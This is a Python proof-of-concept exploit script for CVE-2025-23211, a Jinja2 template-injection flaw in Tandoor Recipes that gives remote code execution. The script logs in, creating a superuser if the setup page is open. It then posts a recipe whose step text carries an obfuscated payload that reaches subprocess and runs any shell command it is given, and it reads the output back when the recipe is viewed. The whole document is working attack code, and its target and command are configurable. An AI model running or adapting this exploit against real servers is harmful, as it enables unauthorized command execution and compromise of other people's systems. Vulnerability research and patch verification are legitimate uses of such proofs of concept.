#!/usr/bin/env python3
import requests
import re
import sys
import argparse

def get_csrf_token(session, url):
    resp = session.get(url)
    match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', resp.text)
    if match:
        return match.group(1)
    return None

def setup_superuser(session, base_url, username, password):
    setup_url = f"{base_url}/setup/"
    csrf = get_csrf_token(session, setup_url)
    if not csrf:
        return False
    data = {
        "csrfmiddlewaretoken": csrf,
        "name": username,
        "password": password,
        "password_confirm": password
    }
    resp = session.post(setup_url, data=data, allow_redirects=True)
    return resp.status_code == 200

def login(session, base_url, username, password):
    login_url = f"{base_url}/accounts/login/"
    csrf = get_csrf_token(session, login_url)
    if not csrf:
        return False
    data = {
        "csrfmiddlewaretoken": csrf,
        "login": username,
        "password": password
    }
    resp = session.post(login_url, data=data, allow_redirects=True)
    return "logout" in resp.text.lower() or "space" in resp.url or "search" in resp.url

def create_space(session, base_url):
    space_url = f"{base_url}/space-overview"
    resp = session.get(space_url)
    if "switch-space" in resp.text:
        match = re.search(r'/switch-space/(\d+)', resp.text)
        if match:
            space_id = match.group(1)
            session.get(f"{base_url}/switch-space/{space_id}")
            return True
    csrf = get_csrf_token(session, space_url)
    if not csrf:
        return False
    data = {
        "csrfmiddlewaretoken": csrf,
        "create-name": "TestSpace"
    }
    resp = session.post(space_url, data=data, allow_redirects=True)
    if "switch-space" in resp.text:
        match = re.search(r'/switch-space/(\d+)', resp.text)
        if match:
            space_id = match.group(1)
            session.get(f"{base_url}/switch-space/{space_id}")
            return True
    return resp.status_code == 200

def create_recipe_with_ssti(session, base_url, command):
    hex_payload = "{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()|attr('\\x5f\\x5fgetitem\\x5f\\x5f')(418)('" + command + "',shell=True,stdout=-1)|attr('communicate')()|attr('\\x5f\\x5fgetitem\\x5f\\x5f')(0)|attr('decode')('utf-8')}}"
    
    create_url = f"{base_url}/api/recipe/"
    headers = {
        "Content-Type": "application/json",
        "X-CSRFToken": session.cookies.get("csrftoken", "")
    }
    recipe_data = {
        "name": "SSTI Test Recipe",
        "description": "Test recipe for SSTI",
        "working_time": 10,
        "waiting_time": 10,
        "servings": 1,
        "servings_text": "serving",
        "steps": [{"instruction": hex_payload, "ingredients": []}]
    }
    resp = session.post(create_url, json=recipe_data, headers=headers)
    if resp.status_code in [200, 201]:
        try:
            return resp.json().get("id")
        except:
            return None
    return None

def view_recipe(session, base_url, recipe_id):
    api_url = f"{base_url}/api/recipe/{recipe_id}/"
    resp = session.get(api_url)
    return resp.text

def extract_command_output(response_text):
    try:
        import json
        data = json.loads(response_text)
        for step in data.get("steps", []):
            md = step.get("instructions_markdown", "")
            match = re.search(r'<p>([^<]+)</p>', md)
            if match:
                return match.group(1).strip()
    except:
        pass
    match = re.search(r'<p[^>]*>\s*(root|[a-zA-Z0-9_\-]+)\s*</p>', response_text)
    if match:
        output = match.group(1).strip()
        if output and len(output) < 50:
            return output
    return None

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-23211 PoC - Tandoor Recipes SSTI RCE")
    parser.add_argument("--target", default="http://127.0.0.1:9080", help="Target URL")
    parser.add_argument("--username", default="admin", help="Username")
    parser.add_argument("--password", default="Vuln_T3st_2025!", help="Password")
    parser.add_argument("--command", default="whoami", help="Command to execute")
    args = parser.parse_args()
    
    base_url = args.target.rstrip("/")
    session = requests.Session()
    
    print(f"[*] Target: {base_url}")
    print(f"[*] Testing CVE-2025-23211 - Jinja2 SSTI RCE")
    
    resp = session.get(base_url, allow_redirects=True)
    if "/setup/" in resp.url:
        print("[*] First time setup detected, creating superuser...")
        if setup_superuser(session, base_url, args.username, args.password):
            print(f"[+] Superuser created: {args.username}")
        else:
            print("[-] Failed to create superuser")
            return False
    
    print(f"[*] Attempting login with {args.username}...")
    if not login(session, base_url, args.username, args.password):
        print("[-] Login failed")
        return False
    print("[+] Login successful")
    
    print("[*] Creating space...")
    if not create_space(session, base_url):
        print("[-] Failed to create space (may already exist)")
    else:
        print("[+] Space created")
    
    print(f"[*] Creating recipe with SSTI payload (command: {args.command})...")
    recipe_id = create_recipe_with_ssti(session, base_url, args.command)
    if not recipe_id:
        print("[-] Failed to create recipe")
        return False
    print(f"[+] Recipe created with ID: {recipe_id}")
    
    print("[*] Viewing recipe to trigger SSTI...")
    resp = view_recipe(session, base_url, recipe_id)
    
    output = extract_command_output(resp)
    if output:
        print(f"[+] VULNERABILITY CONFIRMED!")
        print(f"[+] Command output: {output}")
        if output == "root":
            print("[+] Running as ROOT - Critical privilege level!")
        return True
    else:
        print("[-] Could not extract command output")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
